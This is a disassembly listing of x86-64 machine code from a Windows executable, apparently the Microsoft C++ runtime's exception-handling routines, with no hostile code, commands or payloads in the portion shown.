   140003390:	44 8b c6             	mov    %esi,%r8d
   140003393:	ff 15 77 1f 01 00    	call   *0x11f77(%rip)        # 0x140015310
   140003399:	eb 06                	jmp    0x1400033a1
   14000339b:	ff 15 d7 1d 01 00    	call   *0x11dd7(%rip)        # 0x140015178
   1400033a1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400033a6:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400033ab:	48 83 c4 20          	add    $0x20,%rsp
   1400033af:	5f                   	pop    %rdi
   1400033b0:	c3                   	ret
   1400033b1:	cc                   	int3
   1400033b2:	cc                   	int3
   1400033b3:	cc                   	int3
   1400033b4:	48 8b c4             	mov    %rsp,%rax
   1400033b7:	4c 89 48 20          	mov    %r9,0x20(%rax)
   1400033bb:	4c 89 40 18          	mov    %r8,0x18(%rax)
   1400033bf:	48 89 50 10          	mov    %rdx,0x10(%rax)
   1400033c3:	48 89 48 08          	mov    %rcx,0x8(%rax)
   1400033c7:	53                   	push   %rbx
   1400033c8:	48 83 ec 60          	sub    $0x60,%rsp
   1400033cc:	48 8b d9             	mov    %rcx,%rbx
   1400033cf:	c7 40 d8 00 00 00 00 	movl   $0x0,-0x28(%rax)
   1400033d6:	48 89 48 e8          	mov    %rcx,-0x18(%rax)
   1400033da:	4c 89 40 f0          	mov    %r8,-0x10(%rax)
   1400033de:	e8 19 fb ff ff       	call   0x140002efc
   1400033e3:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400033e8:	8b 0b                	mov    (%rbx),%ecx
   1400033ea:	48 8b 40 10          	mov    0x10(%rax),%rax
   1400033ee:	ff 15 1c 1f 01 00    	call   *0x11f1c(%rip)        # 0x140015310
   1400033f4:	c7 44 24 40 00 00 00 	movl   $0x0,0x40(%rsp)
   1400033fb:	00 
   1400033fc:	eb 00                	jmp    0x1400033fe
   1400033fe:	8b 44 24 40          	mov    0x40(%rsp),%eax
   140003402:	48 83 c4 60          	add    $0x60,%rsp
   140003406:	5b                   	pop    %rbx
   140003407:	c3                   	ret
   140003408:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000340d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140003412:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003417:	57                   	push   %rdi
   140003418:	48 83 ec 20          	sub    $0x20,%rsp
   14000341c:	8b 79 0c             	mov    0xc(%rcx),%edi
   14000341f:	8b f2                	mov    %edx,%esi
   140003421:	48 8b e9             	mov    %rcx,%rbp
   140003424:	85 ff                	test   %edi,%edi
   140003426:	74 2b                	je     0x140003453
   140003428:	8d 5f ff             	lea    -0x1(%rdi),%ebx
   14000342b:	8b fb                	mov    %ebx,%edi
   14000342d:	e8 ca fa ff ff       	call   0x140002efc
   140003432:	48 8d 14 9b          	lea    (%rbx,%rbx,4),%rdx
   140003436:	48 8b 40 60          	mov    0x60(%rax),%rax
   14000343a:	48 8d 0c 90          	lea    (%rax,%rdx,4),%rcx
   14000343e:	48 63 45 10          	movslq 0x10(%rbp),%rax
   140003442:	48 03 c1             	add    %rcx,%rax
   140003445:	3b 70 04             	cmp    0x4(%rax),%esi
   140003448:	7e 05                	jle    0x14000344f
   14000344a:	3b 70 08             	cmp    0x8(%rax),%esi
   14000344d:	7e 06                	jle    0x140003455
   14000344f:	85 db                	test   %ebx,%ebx
   140003451:	75 d5                	jne    0x140003428
   140003453:	33 c0                	xor    %eax,%eax
   140003455:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000345a:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000345f:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140003464:	48 83 c4 20          	add    $0x20,%rsp
   140003468:	5f                   	pop    %rdi
   140003469:	c3                   	ret
   14000346a:	cc                   	int3
   14000346b:	cc                   	int3
   14000346c:	40 53                	rex push %rbx
   14000346e:	48 83 ec 20          	sub    $0x20,%rsp
   140003472:	48 8b da             	mov    %rdx,%rbx
   140003475:	48 8b d1             	mov    %rcx,%rdx
   140003478:	48 8b cb             	mov    %rbx,%rcx
   14000347b:	e8 ac 05 00 00       	call   0x140003a2c
   140003480:	8b d0                	mov    %eax,%edx
   140003482:	48 8b cb             	mov    %rbx,%rcx
   140003485:	e8 7e ff ff ff       	call   0x140003408
   14000348a:	48 85 c0             	test   %rax,%rax
   14000348d:	0f 95 c0             	setne  %al
   140003490:	48 83 c4 20          	add    $0x20,%rsp
   140003494:	5b                   	pop    %rbx
   140003495:	c3                   	ret
   140003496:	cc                   	int3
   140003497:	cc                   	int3
   140003498:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000349d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400034a2:	57                   	push   %rdi
   1400034a3:	48 83 ec 20          	sub    $0x20,%rsp
   1400034a7:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   1400034ac:	49 8b d8             	mov    %r8,%rbx
   1400034af:	48 8b fa             	mov    %rdx,%rdi
   1400034b2:	e8 45 00 00 00       	call   0x1400034fc
   1400034b7:	48 8b d7             	mov    %rdi,%rdx
   1400034ba:	48 8b cb             	mov    %rbx,%rcx
   1400034bd:	48 8b f0             	mov    %rax,%rsi
   1400034c0:	e8 67 05 00 00       	call   0x140003a2c
   1400034c5:	8b d0                	mov    %eax,%edx
   1400034c7:	48 8b cb             	mov    %rbx,%rcx
   1400034ca:	e8 39 ff ff ff       	call   0x140003408
   1400034cf:	48 85 c0             	test   %rax,%rax
   1400034d2:	75 06                	jne    0x1400034da
   1400034d4:	41 83 c9 ff          	or     $0xffffffff,%r9d
   1400034d8:	eb 04                	jmp    0x1400034de
   1400034da:	44 8b 48 04          	mov    0x4(%rax),%r9d
   1400034de:	4c 8b c3             	mov    %rbx,%r8
   1400034e1:	48 8b d7             	mov    %rdi,%rdx
   1400034e4:	48 8b ce             	mov    %rsi,%rcx
   1400034e7:	e8 cc 16 00 00       	call   0x140004bb8
   1400034ec:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400034f1:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400034f6:	48 83 c4 20          	add    $0x20,%rsp
   1400034fa:	5f                   	pop    %rdi
   1400034fb:	c3                   	ret
   1400034fc:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003501:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140003506:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000350b:	57                   	push   %rdi
   14000350c:	41 54                	push   %r12
   14000350e:	41 55                	push   %r13
   140003510:	41 56                	push   %r14
   140003512:	41 57                	push   %r15
   140003514:	48 83 ec 20          	sub    $0x20,%rsp
   140003518:	41 8b 68 0c          	mov    0xc(%r8),%ebp
   14000351c:	4c 8b e9             	mov    %rcx,%r13
   14000351f:	49 8b c8             	mov    %r8,%rcx
   140003522:	49 8b f1             	mov    %r9,%rsi
   140003525:	4d 8b f8             	mov    %r8,%r15
   140003528:	4c 8b e2             	mov    %rdx,%r12
   14000352b:	e8 fc 04 00 00       	call   0x140003a2c
   140003530:	4d 8b 55 00          	mov    0x0(%r13),%r10
   140003534:	44 8b f0             	mov    %eax,%r14d
   140003537:	4c 89 16             	mov    %r10,(%rsi)
   14000353a:	eb 6b                	jmp    0x1400035a7
   14000353c:	49 63 47 10          	movslq 0x10(%r15),%rax
   140003540:	8d 4d ff             	lea    -0x1(%rbp),%ecx
   140003543:	49 8b 7c 24 08       	mov    0x8(%r12),%rdi
   140003548:	8b e9                	mov    %ecx,%ebp
   14000354a:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   14000354e:	48 8d 1c 88          	lea    (%rax,%rcx,4),%rbx
   140003552:	44 3b 74 3b 04       	cmp    0x4(%rbx,%rdi,1),%r14d
   140003557:	7e 4e                	jle    0x1400035a7
   140003559:	44 3b 74 3b 08       	cmp    0x8(%rbx,%rdi,1),%r14d
   14000355e:	7f 47                	jg     0x1400035a7
   140003560:	49 8b 0c 24          	mov    (%r12),%rcx
   140003564:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140003569:	45 33 c0             	xor    %r8d,%r8d
   14000356c:	ff 15 56 1b 01 00    	call   *0x11b56(%rip)        # 0x1400150c8
   140003572:	4c 63 44 3b 10       	movslq 0x10(%rbx,%rdi,1),%r8
   140003577:	33 c9                	xor    %ecx,%ecx
   140003579:	4c 03 44 24 50       	add    0x50(%rsp),%r8
   14000357e:	44 8b 4c 3b 0c       	mov    0xc(%rbx,%rdi,1),%r9d
   140003583:	44 8b 10             	mov    (%rax),%r10d
   140003586:	45 85 c9             	test   %r9d,%r9d
   140003589:	74 17                	je     0x1400035a2
   14000358b:	49 8d 50 0c          	lea    0xc(%r8),%rdx
   14000358f:	48 63 02             	movslq (%rdx),%rax
   140003592:	49 3b c2             	cmp    %r10,%rax
   140003595:	74 16                	je     0x1400035ad
   140003597:	ff c1                	inc    %ecx
   140003599:	48 83 c2 14          	add    $0x14,%rdx
   14000359d:	41 3b c9             	cmp    %r9d,%ecx
   1400035a0:	72 ed                	jb     0x14000358f
   1400035a2:	41 3b c9             	cmp    %r9d,%ecx
   1400035a5:	72 06                	jb     0x1400035ad
   1400035a7:	85 ed                	test   %ebp,%ebp
   1400035a9:	75 91                	jne    0x14000353c
   1400035ab:	eb 14                	jmp    0x1400035c1
   1400035ad:	49 8b 45 00          	mov    0x0(%r13),%rax
   1400035b1:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   1400035b5:	49 63 4c 88 10       	movslq 0x10(%r8,%rcx,4),%rcx
   1400035ba:	48 8b 0c 01          	mov    (%rcx,%rax,1),%rcx
   1400035be:	48 89 0e             	mov    %rcx,(%rsi)
   1400035c1:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   1400035c6:	48 8b c6             	mov    %rsi,%rax
   1400035c9:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   1400035ce:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   1400035d3:	48 83 c4 20          	add    $0x20,%rsp
   1400035d7:	41 5f                	pop    %r15
   1400035d9:	41 5e                	pop    %r14
   1400035db:	41 5d                	pop    %r13
   1400035dd:	41 5c                	pop    %r12
   1400035df:	5f                   	pop    %rdi
   1400035e0:	c3                   	ret
   1400035e1:	cc                   	int3
   1400035e2:	cc                   	int3
   1400035e3:	cc                   	int3
   1400035e4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400035e9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400035ee:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400035f3:	57                   	push   %rdi
   1400035f4:	41 54                	push   %r12
   1400035f6:	41 55                	push   %r13
   1400035f8:	41 56                	push   %r14
   1400035fa:	41 57                	push   %r15
   1400035fc:	48 83 ec 40          	sub    $0x40,%rsp
   140003600:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   140003607:	00 
   140003608:	4c 8b fa             	mov    %rdx,%r15
   14000360b:	48 8b f1             	mov    %rcx,%rsi
   14000360e:	49 8b d1             	mov    %r9,%rdx
   140003611:	48 8b cb             	mov    %rbx,%rcx
   140003614:	49 8b f9             	mov    %r9,%rdi
   140003617:	45 8b f0             	mov    %r8d,%r14d
   14000361a:	8b 6b 0c             	mov    0xc(%rbx),%ebp
   14000361d:	e8 0a 04 00 00       	call   0x140003a2c
   140003622:	45 33 d2             	xor    %r10d,%r10d
   140003625:	44 8b c8             	mov    %eax,%r9d
   140003628:	85 ed                	test   %ebp,%ebp
   14000362a:	0f 84 e4 00 00 00    	je     0x140003714
   140003630:	48 8b 7f 08          	mov    0x8(%rdi),%rdi
   140003634:	41 83 cc ff          	or     $0xffffffff,%r12d
   140003638:	4c 63 5b 10          	movslq 0x10(%rbx),%r11
   14000363c:	45 8b c4             	mov    %r12d,%r8d
   14000363f:	45 8b ec             	mov    %r12d,%r13d
   140003642:	8b d5                	mov    %ebp,%edx
   140003644:	8d 42 ff             	lea    -0x1(%rdx),%eax
   140003647:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   14000364b:	8d 1a                	lea    (%rdx),%ebx
   14000364d:	8b d0                	mov    %eax,%edx
   14000364f:	48 8d 04 8f          	lea    (%rdi,%rcx,4),%rax
   140003653:	46 3b 4c 18 04       	cmp    0x4(%rax,%r11,1),%r9d
   140003658:	7e 0b                	jle    0x140003665
   14000365a:	46 3b 4c 18 08       	cmp    0x8(%rax,%r11,1),%r9d
   14000365f:	0f 8e 9c 00 00 00    	jle    0x140003701
   140003665:	85 d2                	test   %edx,%edx
   140003667:	75 db                	jne    0x140003644
   140003669:	4d 8b ca             	mov    %r10,%r9
   14000366c:	41 8b d2             	mov    %r10d,%edx
   14000366f:	4a 8d 0c 1f          	lea    (%rdi,%r11,1),%rcx
   140003673:	4d 85 c9             	test   %r9,%r9
   140003676:	74 11                	je     0x140003689
   140003678:	41 8b 41 04          	mov    0x4(%r9),%eax
   14000367c:	39 01                	cmp    %eax,(%rcx)
   14000367e:	7e 1e                	jle    0x14000369e
   140003680:	41 8b 41 08          	mov    0x8(%r9),%eax
   140003684:	39 41 04             	cmp    %eax,0x4(%rcx)
   140003687:	7f 15                	jg     0x14000369e
   140003689:	44 3b 31             	cmp    (%rcx),%r14d
   14000368c:	7c 10                	jl     0x14000369e
   14000368e:	44 3b 71 04          	cmp    0x4(%rcx),%r14d
   140003692:	7f 0a                	jg     0x14000369e
   140003694:	45 3b c4             	cmp    %r12d,%r8d
   140003697:	44 8b ea             	mov    %edx,%r13d
   14000369a:	44 0f 44 c2          	cmove  %edx,%r8d
   14000369e:	ff c2                	inc    %edx
   1400036a0:	48 83 c1 14          	add    $0x14,%rcx
   1400036a4:	3b d5                	cmp    %ebp,%edx
   1400036a6:	72 cb                	jb     0x140003673
   1400036a8:	41 8b c2             	mov    %r10d,%eax
   1400036ab:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   1400036b0:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   1400036b5:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   1400036ba:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   1400036be:	45 3b c4             	cmp    %r12d,%r8d
   1400036c1:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   1400036c5:	41 0f 45 c0          	cmovne %r8d,%eax
   1400036c9:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400036cd:	41 8d 45 01          	lea    0x1(%r13),%eax
   1400036d1:	0f 10 44 24 20       	movups 0x20(%rsp),%xmm0
   1400036d6:	44 0f 45 d0          	cmovne %eax,%r10d
   1400036da:	48 8b c6             	mov    %rsi,%rax
   1400036dd:	44 89 54 24 38       	mov    %r10d,0x38(%rsp)
   1400036e2:	0f 10 4c 24 30       	movups 0x30(%rsp),%xmm1
   1400036e7:	f3 0f 7f 06          	movdqu %xmm0,(%rsi)
   1400036eb:	f3 0f 7f 4e 10       	movdqu %xmm1,0x10(%rsi)
   1400036f0:	49 8b 73 40          	mov    0x40(%r11),%rsi
   1400036f4:	49 8b e3             	mov    %r11,%rsp
   1400036f7:	41 5f                	pop    %r15
   1400036f9:	41 5e                	pop    %r14
   1400036fb:	41 5d                	pop    %r13
   1400036fd:	41 5c                	pop    %r12
   1400036ff:	5f                   	pop    %rdi
   140003700:	c3                   	ret
   140003701:	8d 43 ff             	lea    -0x1(%rbx),%eax
   140003704:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   140003708:	4c 8d 0c 87          	lea    (%rdi,%rax,4),%r9
   14000370c:	4d 03 cb             	add    %r11,%r9
   14000370f:	e9 58 ff ff ff       	jmp    0x14000366c
   140003714:	e8 d7 58 00 00       	call   0x140008ff0
   140003719:	cc                   	int3
   14000371a:	cc                   	int3
   14000371b:	cc                   	int3
   14000371c:	40 55                	rex push %rbp
   14000371e:	48 8d 6c 24 e1       	lea    -0x1f(%rsp),%rbp
   140003723:	48 81 ec e0 00 00 00 	sub    $0xe0,%rsp
   14000372a:	48 8b 05 cf d8 01 00 	mov    0x1d8cf(%rip),%rax        # 0x140021000
   140003731:	48 33 c4             	xor    %rsp,%rax
   140003734:	48 89 45 0f          	mov    %rax,0xf(%rbp)
   140003738:	4c 8b 55 77          	mov    0x77(%rbp),%r10
   14000373c:	48 8d 05 6d 30 01 00 	lea    0x1306d(%rip),%rax        # 0x1400167b0
   140003743:	0f 10 00             	movups (%rax),%xmm0
   140003746:	4c 8b d9             	mov    %rcx,%r11
   140003749:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000374e:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140003752:	0f 11 01             	movups %xmm0,(%rcx)
   140003755:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140003759:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   14000375d:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140003761:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140003765:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140003769:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   14000376d:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140003771:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140003775:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140003779:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   14000377d:	0f 10 88 80 00 00 00 	movups 0x80(%rax),%xmm1
   140003784:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140003788:	0f 10 40 70          	movups 0x70(%rax),%xmm0
   14000378c:	48 8b 80 90 00 00 00 	mov    0x90(%rax),%rax
   140003793:	0f 11 41 70          	movups %xmm0,0x70(%rcx)
   140003797:	0f 11 89 80 00 00 00 	movups %xmm1,0x80(%rcx)
   14000379e:	48 89 81 90 00 00 00 	mov    %rax,0x90(%rcx)
   1400037a5:	48 8d 05 88 11 00 00 	lea    0x1188(%rip),%rax        # 0x140004934
   1400037ac:	49 8b 0b             	mov    (%r11),%rcx
   1400037af:	48 89 45 8f          	mov    %rax,-0x71(%rbp)
   1400037b3:	48 8b 45 4f          	mov    0x4f(%rbp),%rax
   1400037b7:	48 89 45 9f          	mov    %rax,-0x61(%rbp)
   1400037bb:	48 63 45 5f          	movslq 0x5f(%rbp),%rax
   1400037bf:	48 89 45 a7          	mov    %rax,-0x59(%rbp)
   1400037c3:	48 8b 45 57          	mov    0x57(%rbp),%rax
   1400037c7:	48 89 45 b7          	mov    %rax,-0x49(%rbp)
   1400037cb:	0f b6 45 7f          	movzbl 0x7f(%rbp),%eax
   1400037cf:	48 89 45 c7          	mov    %rax,-0x39(%rbp)
   1400037d3:	49 8b 42 40          	mov    0x40(%r10),%rax
   1400037d7:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400037dc:	49 8b 42 28          	mov    0x28(%r10),%rax
   1400037e0:	4c 89 4d 97          	mov    %r9,-0x69(%rbp)
   1400037e4:	45 33 c9             	xor    %r9d,%r9d
   1400037e7:	4c 89 45 af          	mov    %r8,-0x51(%rbp)
   1400037eb:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1400037f0:	48 89 55 bf          	mov    %rdx,-0x41(%rbp)
   1400037f4:	49 8b 12             	mov    (%r10),%rdx
   1400037f7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400037fc:	48 c7 45 cf 20 05 93 	movq   $0x19930520,-0x31(%rbp)
   140003803:	19 
   140003804:	ff 15 36 19 01 00    	call   *0x11936(%rip)        # 0x140015140
   14000380a:	48 8b 4d 0f          	mov    0xf(%rbp),%rcx
   14000380e:	48 33 cc             	xor    %rsp,%rcx
   140003811:	e8 0a e2 ff ff       	call   0x140001a20
   140003816:	48 81 c4 e0 00 00 00 	add    $0xe0,%rsp
   14000381d:	5d                   	pop    %rbp
   14000381e:	c3                   	ret
   14000381f:	cc                   	int3
   140003820:	40 53                	rex push %rbx
   140003822:	48 83 ec 20          	sub    $0x20,%rsp
   140003826:	48 8b d9             	mov    %rcx,%rbx
   140003829:	48 89 11             	mov    %rdx,(%rcx)
   14000382c:	e8 cb f6 ff ff       	call   0x140002efc
   140003831:	48 3b 58 58          	cmp    0x58(%rax),%rbx
   140003835:	73 0b                	jae    0x140003842
   140003837:	e8 c0 f6 ff ff       	call   0x140002efc
   14000383c:	48 8b 48 58          	mov    0x58(%rax),%rcx
   140003840:	eb 02                	jmp    0x140003844
   140003842:	33 c9                	xor    %ecx,%ecx
   140003844:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   140003848:	e8 af f6 ff ff       	call   0x140002efc
   14000384d:	48 89 58 58          	mov    %rbx,0x58(%rax)
   140003851:	48 8b c3             	mov    %rbx,%rax
   140003854:	48 83 c4 20          	add    $0x20,%rsp
   140003858:	5b                   	pop    %rbx
   140003859:	c3                   	ret
   14000385a:	cc                   	int3
   14000385b:	cc                   	int3
   14000385c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003861:	57                   	push   %rdi
   140003862:	48 83 ec 20          	sub    $0x20,%rsp
   140003866:	48 8b f9             	mov    %rcx,%rdi
   140003869:	e8 8e f6 ff ff       	call   0x140002efc
   14000386e:	48 3b 78 58          	cmp    0x58(%rax),%rdi
   140003872:	75 35                	jne    0x1400038a9
   140003874:	e8 83 f6 ff ff       	call   0x140002efc
   140003879:	48 8b 50 58          	mov    0x58(%rax),%rdx
   14000387d:	48 85 d2             	test   %rdx,%rdx
   140003880:	74 27                	je     0x1400038a9
   140003882:	48 8b 5a 08          	mov    0x8(%rdx),%rbx
   140003886:	48 3b fa             	cmp    %rdx,%rdi
   140003889:	74 0a                	je     0x140003895
   14000388b:	48 8b d3             	mov    %rbx,%rdx
   14000388e:	48 85 db             	test   %rbx,%rbx
   140003891:	74 16                	je     0x1400038a9
   140003893:	eb ed                	jmp    0x140003882
   140003895:	e8 62 f6 ff ff       	call   0x140002efc
   14000389a:	48 89 58 58          	mov    %rbx,0x58(%rax)
   14000389e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400038a3:	48 83 c4 20          	add    $0x20,%rsp
   1400038a7:	5f                   	pop    %rdi
   1400038a8:	c3                   	ret
   1400038a9:	e8 42 57 00 00       	call   0x140008ff0
   1400038ae:	cc                   	int3
   1400038af:	cc                   	int3
   1400038b0:	48 83 ec 28          	sub    $0x28,%rsp
   1400038b4:	e8 43 f6 ff ff       	call   0x140002efc
   1400038b9:	48 8b 40 60          	mov    0x60(%rax),%rax
   1400038bd:	48 83 c4 28          	add    $0x28,%rsp
   1400038c1:	c3                   	ret
   1400038c2:	cc                   	int3
   1400038c3:	cc                   	int3
   1400038c4:	48 83 ec 28          	sub    $0x28,%rsp
   1400038c8:	e8 2f f6 ff ff       	call   0x140002efc
   1400038cd:	48 8b 40 68          	mov    0x68(%rax),%rax
   1400038d1:	48 83 c4 28          	add    $0x28,%rsp
   1400038d5:	c3                   	ret
   1400038d6:	cc                   	int3
   1400038d7:	cc                   	int3
   1400038d8:	40 53                	rex push %rbx
   1400038da:	48 83 ec 20          	sub    $0x20,%rsp
   1400038de:	48 8b d9             	mov    %rcx,%rbx
   1400038e1:	e8 16 f6 ff ff       	call   0x140002efc
   1400038e6:	48 89 58 60          	mov    %rbx,0x60(%rax)
   1400038ea:	48 83 c4 20          	add    $0x20,%rsp
   1400038ee:	5b                   	pop    %rbx
   1400038ef:	c3                   	ret
   1400038f0:	40 53                	rex push %rbx
   1400038f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400038f6:	48 8b d9             	mov    %rcx,%rbx
   1400038f9:	e8 fe f5 ff ff       	call   0x140002efc
   1400038fe:	48 89 58 68          	mov    %rbx,0x68(%rax)
   140003902:	48 83 c4 20          	add    $0x20,%rsp
   140003906:	5b                   	pop    %rbx
   140003907:	c3                   	ret
   140003908:	48 8b c4             	mov    %rsp,%rax
   14000390b:	48 89 58 10          	mov    %rbx,0x10(%rax)
   14000390f:	48 89 68 18          	mov    %rbp,0x18(%rax)
   140003913:	48 89 70 20          	mov    %rsi,0x20(%rax)
   140003917:	57                   	push   %rdi
   140003918:	48 83 ec 40          	sub    $0x40,%rsp
   14000391c:	49 8b 59 08          	mov    0x8(%r9),%rbx
   140003920:	49 8b f9             	mov    %r9,%rdi
   140003923:	49 8b f0             	mov    %r8,%rsi
   140003926:	48 89 50 08          	mov    %rdx,0x8(%rax)
   14000392a:	48 8b e9             	mov    %rcx,%rbp
   14000392d:	e8 ca f5 ff ff       	call   0x140002efc
   140003932:	48 89 58 60          	mov    %rbx,0x60(%rax)
   140003936:	48 8b 5d 38          	mov    0x38(%rbp),%rbx
   14000393a:	e8 bd f5 ff ff       	call   0x140002efc
   14000393f:	48 89 58 68          	mov    %rbx,0x68(%rax)
   140003943:	e8 b4 f5 ff ff       	call   0x140002efc
   140003948:	48 8b 57 38          	mov    0x38(%rdi),%rdx
   14000394c:	4c 8b cf             	mov    %rdi,%r9
   14000394f:	4c 8b c6             	mov    %rsi,%r8
   140003952:	8b 0a                	mov    (%rdx),%ecx
   140003954:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140003959:	48 03 48 60          	add    0x60(%rax),%rcx
   14000395d:	33 c0                	xor    %eax,%eax
   14000395f:	88 44 24 38          	mov    %al,0x38(%rsp)
   140003963:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140003968:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000396c:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140003971:	48 8b cd             	mov    %rbp,%rcx
   140003974:	e8 53 0f 00 00       	call   0x1400048cc
   140003979:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   14000397e:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140003983:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   140003988:	48 83 c4 40          	add    $0x40,%rsp
   14000398c:	5f                   	pop    %rdi
   14000398d:	c3                   	ret
   14000398e:	cc                   	int3
   14000398f:	cc                   	int3
   140003990:	48 83 ec 28          	sub    $0x28,%rsp
   140003994:	4d 63 48 1c          	movslq 0x1c(%r8),%r9
   140003998:	4d 8b d0             	mov    %r8,%r10
   14000399b:	48 8b 01             	mov    (%rcx),%rax
   14000399e:	41 8b 04 01          	mov    (%r9,%rax,1),%eax
   1400039a2:	83 f8 fe             	cmp    $0xfffffffe,%eax
   1400039a5:	75 0b                	jne    0x1400039b2
   1400039a7:	4c 8b 02             	mov    (%rdx),%r8
   1400039aa:	49 8b ca             	mov    %r10,%rcx
   1400039ad:	e8 82 00 00 00       	call   0x140003a34
   1400039b2:	48 83 c4 28          	add    $0x28,%rsp
   1400039b6:	c3                   	ret
   1400039b7:	cc                   	int3
   1400039b8:	40 53                	rex push %rbx
   1400039ba:	48 83 ec 20          	sub    $0x20,%rsp
   1400039be:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1400039c3:	49 8b d8             	mov    %r8,%rbx
   1400039c6:	e8 31 fb ff ff       	call   0x1400034fc
   1400039cb:	48 8b 08             	mov    (%rax),%rcx
   1400039ce:	48 63 43 1c          	movslq 0x1c(%rbx),%rax
   1400039d2:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   1400039d7:	8b 44 08 04          	mov    0x4(%rax,%rcx,1),%eax
   1400039db:	48 83 c4 20          	add    $0x20,%rsp
   1400039df:	5b                   	pop    %rbx
   1400039e0:	c3                   	ret
   1400039e1:	cc                   	int3
   1400039e2:	cc                   	int3
   1400039e3:	cc                   	int3
   1400039e4:	48 63 52 1c          	movslq 0x1c(%rdx),%rdx
   1400039e8:	48 8b 01             	mov    (%rcx),%rax
   1400039eb:	44 89 04 02          	mov    %r8d,(%rdx,%rax,1)
   1400039ef:	c3                   	ret
   1400039f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400039f5:	57                   	push   %rdi
   1400039f6:	48 83 ec 20          	sub    $0x20,%rsp
   1400039fa:	41 8b f9             	mov    %r9d,%edi
   1400039fd:	49 8b d8             	mov    %r8,%rbx
   140003a00:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140003a05:	e8 f2 fa ff ff       	call   0x1400034fc
   140003a0a:	48 8b 08             	mov    (%rax),%rcx
   140003a0d:	48 63 43 1c          	movslq 0x1c(%rbx),%rax
   140003a11:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140003a16:	3b 7c 08 04          	cmp    0x4(%rax,%rcx,1),%edi
   140003a1a:	7e 04                	jle    0x140003a20
   140003a1c:	89 7c 08 04          	mov    %edi,0x4(%rax,%rcx,1)
   140003a20:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003a25:	48 83 c4 20          	add    $0x20,%rsp
   140003a29:	5f                   	pop    %rdi
   140003a2a:	c3                   	ret
   140003a2b:	cc                   	int3
   140003a2c:	4c 8b 02             	mov    (%rdx),%r8
   140003a2f:	e9 00 00 00 00       	jmp    0x140003a34
   140003a34:	40 53                	rex push %rbx
   140003a36:	48 83 ec 20          	sub    $0x20,%rsp
   140003a3a:	49 8b d8             	mov    %r8,%rbx
   140003a3d:	48 85 c9             	test   %rcx,%rcx
   140003a40:	74 52                	je     0x140003a94
   140003a42:	4c 63 59 18          	movslq 0x18(%rcx),%r11
   140003a46:	4c 8b 52 08          	mov    0x8(%rdx),%r10
   140003a4a:	4b 8d 04 1a          	lea    (%r10,%r11,1),%rax
   140003a4e:	48 85 c0             	test   %rax,%rax
   140003a51:	74 41                	je     0x140003a94
   140003a53:	44 8b 41 14          	mov    0x14(%rcx),%r8d
   140003a57:	45 33 c9             	xor    %r9d,%r9d
   140003a5a:	45 85 c0             	test   %r8d,%r8d
